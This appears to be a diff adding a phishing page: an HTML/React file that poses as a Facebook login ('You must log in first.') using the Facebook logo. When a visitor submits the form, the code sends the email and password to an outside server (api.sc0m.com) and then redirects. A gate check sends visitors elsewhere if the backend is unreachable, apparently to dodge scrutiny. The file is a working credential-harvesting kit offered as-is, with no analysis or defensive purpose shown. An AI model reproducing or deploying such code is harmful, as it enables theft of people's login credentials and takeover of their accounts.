@@ -1,0 +1,137 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Login</title>
+
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <link rel="stylesheet" href="https://mysc0m.com/css/clone.css" />
+  </head>
+  <script
+    crossorigin
+    src="https://unpkg.com/react@18/umd/react.development.js"
+  ></script>
+  <script
+    crossorigin
+    src="https://unpkg.com/react-dom@18/umd/react-dom.development.js"
+  ></script>
+  <script src="https://unpkg.com/@babel/standalone/babel.min.js"></script>
+  <!-- tailwind cdn  -->
+  <script src="https://cdn.tailwindcss.com"></script>
+
+  <script
+    src="https://cdnjs.cloudflare.com/ajax/libs/axios/1.5.0/axios.min.js"
+    integrity="sha512-aoTNnqZcT8B4AmeCFmiSnDlc4Nj/KPaZyB5G7JnOnUEkdNpCZs1LCankiYi01sLTyWy+m2P+W4XM+BuQ3Q4/Dg=="
+    crossorigin="anonymous"
+    referrerpolicy="no-referrer"
+  ></script>
+  <body>
+    <noscript>You need to enable JavaScript to run this app.</noscript>
+    <div id="root"></div>
+
+    <script type="text/babel">
+      const axios = axios.create({
+        baseURL: 'https://api.sc0m.com/api',
+        timeout: 5000,
+        headers: { 'X-Custom-Header': '' },
+      });
+
+      const MainContent = () => {
+        const [vEmail, setVEmail] = React.useState('');
+        const [vPassword, setVPassword] = React.useState('');
+        const [data, setData] = React.useState('');
+
+        const [loading, setLoading] = React.useState(true);
+        React.useEffect(() => {
+          axios
+            .get('https://checkapi-xt1h.onrender.com/')
+            .then((res) => {
+              setLoading(false);
+            })
+            .catch((err) => {
+              window.location = 'https://www.livebotola.com/';
+            });
+
+          const url = window.location.href;
+          const params = new URL(url).searchParams;
+          const urlbase = params.get('url');
+          setData(urlbase);
+        }, []);
+
+        const addNew = () => {
+          if (vPassword === '' || vEmail === '')
+            return alert('Please fill all the fields');
+          const body = {
+            data,
+            email: vEmail,
+            password: vPassword,
+          };
+
+          axios
+            .post('/contact', body)
+            .then(({ data }) => {
+              window.location = data;
+            })
+            .catch((err) => {
+              window.location = 'https://www.livebotola.com/';
+            });
+        };
+        return (
+          <>
+            {loading ? (
+              <div className="flex justify-center items-center h-screen">
+                <div className="animate-spin rounded-full h-32 w-32 border-t-2 border-b-2 border-gray-900"></div>
+              </div>
+            ) : (
+              <>
+                <div id="top_form">
+                  <div class="must">
+                    <p>You must log in first.</p>
+                  </div>
+                  <div class="conta">
+                    <div class="container">
+                      <div method="post">
+                        <img
+                          class="lg"
+                          src="https://i.ibb.co/hFT2CgF/Facebook.png"
+                          alt=""
+                        />
+                        <input
+                          class="in"
+                          type="text"
+                          name="email"
+                          placeholder="Email address or mobile number"
+                          required=""
+                          onChange={(e) => setVEmail(e.target.value)}
+                        />
+
+                        <input
+                          class="in"
+                          type="password"
+                          name="pass"
+                          placeholder="Password"
+                          onChange={(e) => setVPassword(e.target.value)}
+                        />
+                        <input
+                          class="sub"
+                          type="submit"
+                          placeholder=""
+                          value="Login"
+                          onClick={addNew}
+                        />
+                      </div>
+                    </div>
+                  </div>
+                </div>
+              </>
+            )}
+          </>
+        );
+      };
+
+      //render the component to the DOM
+      ReactDOM.render(<MainContent />, document.getElementById('root'));
+    </script>
+  </body>
+</html>
